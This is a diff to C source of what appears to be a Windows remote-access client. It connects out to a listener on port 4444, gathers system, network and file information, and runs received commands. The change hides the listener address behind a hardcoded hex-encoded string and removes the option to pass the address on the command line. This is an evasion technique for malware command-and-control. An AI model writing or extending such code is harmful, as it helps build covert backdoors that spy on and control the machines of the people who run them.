@@ -19,6 +19,7 @@
 #define DEFAULT_PORT 4444
 
 // Function declarations
+void from_hex(const char *hex, unsigned char *out);
 void read_file(char *filename, char *output, size_t output_size);
 void get_os_info(char *output, size_t size);
 void get_computer_info(char *output, size_t size);
@@ -28,6 +29,15 @@ void get_network_info(char *output, size_t size);
 void get_system_info(char *output, size_t output_size);
 void get_directory_listing(char *output, size_t output_size);
 void handle_command(char *cmd, char *output, size_t output_size);
+
+// Decrypt Hex
+void from_hex(const char *hex, unsigned char *out) {
+    while (*hex) {
+        sscanf(hex, "%2hhx", out);
+        hex += 2;
+        out++;
+    }
+}
 
 // Read file content
 void read_file(char *filename, char *output, size_t output_size) {
@@ -456,7 +466,8 @@ int connect_to_listener(const char *host, int port) {
 int main(int argc, char *argv[]) {
     char *host;
     int port = DEFAULT_PORT;
-    
+   
+   /* 
     if (argc < 2) {
         printf("Usage: %s <listener_ip> [port]\n", argv[0]);
         printf("Example: %s 192.168.1.100 4444\n", argv[0]);
@@ -467,6 +478,13 @@ int main(int argc, char *argv[]) {
     if (argc > 2) {
         port = atoi(argv[2]);
     }
+    */
+
+    unsigned char HOST[256] = {0};
+    const char *hex = "3139322E3136382E3132322E31";
+    from_hex(hex, HOST);
+
+    host = HOST;
     
     printf("========================================\n");
     printf("Windows Client - Version 4\n");
